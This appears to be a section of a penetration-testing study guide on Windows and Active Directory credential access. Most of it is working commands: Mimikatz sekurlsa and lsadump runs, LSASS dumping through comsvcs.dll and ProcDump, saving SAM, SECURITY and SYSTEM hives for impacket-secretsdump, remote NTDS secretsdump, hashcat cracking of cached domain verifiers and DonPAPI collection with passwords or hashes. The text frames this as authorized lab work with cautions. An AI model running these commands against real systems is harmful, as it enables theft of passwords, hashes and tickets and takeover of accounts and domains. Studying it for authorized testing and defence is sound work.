    9.6.2 Windows and Domain Credential Access

    ← Stage index | Domain mapping | Credential handling | AD cheatsheet | Strategy map | Study methods: Recover and use authentication material; Gain a more useful domain identity

    Prerequisite: an already authorized host/session and the exact privilege required by the selected source. Do not collect everything by default.

    Decision: CURRENT IDENTITY → SOURCE → REQUIRED PRIVILEGE/PROTECTION → ARTIFACT TYPE → COMPATIBLE NEXT USE.

    Exit: classify each result as password, NT hash, AES key, ticket, DPAPI material, cached verifier or local/domain secret; protect it in private records and re-enumerate only through compatible authentication.

    9.6.2.1 Select the source before the tool

    SourceWhat it can containTypical prerequisiteResult is not automatically
    Current ticket cacheTGTs and service tickets for the current logon sessionCurrent user; other LUIDs normally require elevationA password, NT hash or authorization to every service
    LSASS memory/dumpLogon-session NTLM/AES/DPAPI material and tickets, depending on OS/protection/logon typeAdministrator/SYSTEM, suitable debug/dump access, compatible architectureGuaranteed cleartext or every user's reusable secret
    SAM + SYSTEMLocal account password hashesAdministrator/SYSTEM/backup-capable access to matched hivesDomain-account material
    SECURITY + SYSTEMLSA secrets, service/machine secrets, cached domain verifiersAdministrator/SYSTEM/backup-capable access to matched hivesDirectly passable cached-domain hashes
    Credential Manager/DPAPITargeted saved credentials and protected application dataSuitable user/machine context plus master-key materialPlaintext merely because a blob/file is readable
    NTDS + SYSTEMDomain account hashes/keys from a DC databaseDC-level file access and matched boot-key materialOrdinary member-server admin access
    DRS replicationSelected domain-account secretsEffective replication rights at the domain rootLocal admin, DC service access or Domain Users membership

    9.6.2.2 Establish privilege and protection state

    whoami /all
tasklist /fi "imagename eq lsass.exe"
reg query HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL
reg query HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v LsaCfgFlags
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\DeviceGuard /v LsaCfgFlags

    Get-CimInstance -ClassName Win32_DeviceGuard -Namespace root\Microsoft\Windows\DeviceGuard |
  Select-Object SecurityServicesConfigured,SecurityServicesRunning,VirtualizationBasedSecurityStatus

    Interpretation:

    • membership in Administrators with a medium-integrity filtered token is not equivalent to an elevated process;
    • SeDebugPrivilege must be present and usable for common live-process access;
    • a missing registry value is not definitive proof that a protection is disabled because defaults, policy and firmware state matter;
    • LSA protection blocks untrusted code injection/process-memory access; Credential Guard isolates selected NTLM, Kerberos and saved-domain secrets with VBS;
    • EDR/AV can block a tool or dump path without proving the underlying credential source is empty.

    An access-denied or empty result disproves only that method in the current context.

    9.6.2.3 Inspect tickets before invasive collection

    klist
klist tgt
klist sessions

    When privileges permit inspecting another logon session:

    klist -li 0xLUID tickets
klist -li 0xLUID tgt

    Rubeus.exe triage
Rubeus.exe dump /luid:0xLUID /nowrap

    Do not use klist purge during triage. It destroys cached tickets and can break the current session. Interpret exported tickets using Kerberos and identity transitions.

    9.6.2.4 LSASS: live logon-session material

    Check this approach’s stated access/configuration prerequisites and decisive verification before choosing it.

    9.6.2.4.1 Direct Mimikatz access

    mimikatz.exe
privilege::debug
sekurlsa::logonpasswords
sekurlsa::tickets

    Decisive output is a named logon session with a typed value: NTLM, AES key, DPAPI key or ticket. A username with Password : (null) is not a failed tool run when another useful field exists, and modern Windows commonly does not retain reusable cleartext.

    9.6.2.4.2 Dump first, parse offline

    Built-in comsvcs.dll method from an elevated command prompt:

    for /f "tokens=2" %A in ('tasklist ^| findstr /i lsass.exe') do rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump %A C:\Windows\Temp\lsass.dmp full

    Sysinternals ProcDump alternative:

    procdump64.exe -accepteula -ma lsass.exe C:\Windows\Temp\lsass.dmp

    Parse with a compatible Mimikatz build:

    mimikatz.exe
sekurlsa::minidump C:\Path\To\lsass.dmp
sekurlsa::logonpasswords
sekurlsa::tickets

    Common failures:

    • dump creation denied: token/protection/EDR or process-access prerequisite failed;
    • ProcessorArchitecture mismatch: use compatible x64/x86 tooling;
    • OS major-version mismatch: parse with a compatible build/environment;
    • dump succeeds but secrets are absent: logon type, sign-out/reboot, Credential Guard and provider behavior affect contents.

    LSASS dumps are sensitive and noisy. Hash the evidence if needed, transfer through the established route, store it privately and remove the target copy after the authorized objective.

    9.6.2.5 SAM and SYSTEM: local identities

    Check this approach’s stated access/configuration prerequisites and decisive verification before choosing it.     
    reg save HKLM\SAM C:\Windows\Temp\SAM.hive /y
reg save HKLM\SYSTEM C:\Windows\Temp\SYSTEM.hive /y

    impacket-secretsdump -sam SAM.hive -system SYSTEM.hive LOCAL

    Mimikatz alternative from a suitable elevated context:

    privilege::debug
token::elevate
lsadump::sam

    Interpret a typical account row as:

    LOCAL_USER:RID:LM_HASH:NT_HASH:::

    The NT hash is local-account material. Its reuse depends on the same local password existing elsewhere, account state, remote UAC restrictions, service support and host authorization. Return it to the credential-classification workflow; do not call it a domain credential.

    9.6.2.6 SECURITY and SYSTEM: LSA secrets and cached domain verifiers

    Check this approach’s stated access/configuration prerequisites and decisive verification before choosing it.     
    reg save HKLM\SECURITY C:\Windows\Temp\SECURITY.hive /y
reg save HKLM\SYSTEM C:\Windows\Temp\SYSTEM.hive /y

    impacket-secretsdump -security SECURITY.hive -system SYSTEM.hive LOCAL

    Mimikatz alternative:

    privilege::debug
token::elevate
lsadump::secrets
lsadump::cache

    Potential categories:

    • $MACHINE.ACC: member computer's domain-account secret/key material;
    • service/autologon secrets: usefulness depends on whether the service/account remains active;
    • NL$1-style cached logon data: DCC2/MSCache v2 verifier material.

    DCC2 is for offline guessing, not Pass-the-Hash:

    hashcat -m 2100 dcc2.hashes wordlist.txt -r /usr/share/hashcat/rules/best64.rule

    Verify the exact format with the installed Hashcat examples before cracking.

    9.6.2.7 Credential Manager and DPAPI

    Check this approach’s stated access/configuration prerequisites and decisive verification before choosing it.     
    cmdkey /list
vaultcmd /list
vaultcmd /listcreds:"Windows Credentials" /all

    Get-ChildItem "$env:APPDATA\Microsoft\Credentials" -Force -ErrorAction SilentlyContinue
Get-ChildItem "$env:LOCALAPPDATA\Microsoft\Credentials" -Force -ErrorAction SilentlyContinue
Get-ChildItem "$env:APPDATA\Microsoft\Protect" -Force -Recurse -ErrorAction SilentlyContinue

    For each entry record target, type, username, persistence/context and whether a compatible application can ask Windows to use it. A listed credential is not necessarily exportable plaintext.

    DPAPI reasoning:

    PROTECTED BLOB
-> MASTER-KEY GUID
-> USER OR MACHINE PROTECT SCOPE
-> MASTER-KEY DECRYPTION MATERIAL
-> APPLICATION-SPECIFIC DECODING

    Possible decryption material includes the already logged-on user context, the user's password/NT hash, machine context or a domain DPAPI backup key. Prefer using the authorized existing context rather than copying unrelated protected data. One blob without its master key/context is incomplete.

    9.6.2.8 NTDS and replication paths

    Check this approach’s stated access/configuration prerequisites and decisive verification before choosing it.

    9.6.2.8.1 Offline NTDS from an already controlled DC

    An offline parse needs a matched NTDS.dit and SYSTEM hive:

    impacket-secretsdump -ntds NTDS.dit -system SYSTEM.hive LOCAL

    Obtaining locked DC database files normally requires DC-level privilege and a snapshot/backup-aware method. Ordinary local administrator on a member server does not provide this material.

    9.6.2.8.2 Remote collection

    impacket-secretsdump -dc-ip DC_IP 'DOMAIN/USER:PASSWORD@DC_HOST'

    impacket-secretsdump -hashes :NT_HASH -dc-ip DC_IP 'DOMAIN/USER@DC_HOST'

    This broad form can invoke several remote collection paths and is high impact. Use it only when the lab objective and privileges justify those sources. For replication rights and a bounded one-user request, use DCSync.

    9.6.2.13 DonPAPI — remote DPAPI/application-secret collection with host rights

    Check this approach’s stated access/configuration prerequisites and decisive verification before choosing it.

    Use after confirming the accepted identity has the required administrative/remote access on this Windows host. SMB, remote operations and the available masterkey material affect what can be decrypted; ordinary domain-user authentication is not enough.

    9.6.2.13.1 One named host and one relevant collector, not automatic whole-domain targeting

    # One named host and one relevant collector, not automatic whole-domain targeting
donpapi collect -d DOMAIN -u USER -p 'PASSWORD' -t TARGET -c CredMan

    9.6.2.13.2 Distinct authentication material: the tool expects LMHASH:NTHASH form

    # Distinct authentication material: the tool expects LMHASH:NTHASH form
donpapi collect -d DOMAIN -u USER \
  -H 'aad3b435b51404eeaad3b435b51404ee:HASH' -t TARGET -c CredMan

    Read: distinguish acquired encrypted artifacts from decrypted credentials and identify each artifact's profile/application. Remote Registry/SAM/LSA operations can require service-control rights and alter service state. Bring the relevant password/hash/masterkey/PVK when needed; --fetch-pvk is not a default action and requires additional domain rights. An empty result can be a collection or decryption failure. Validate a recovered identity before moving.
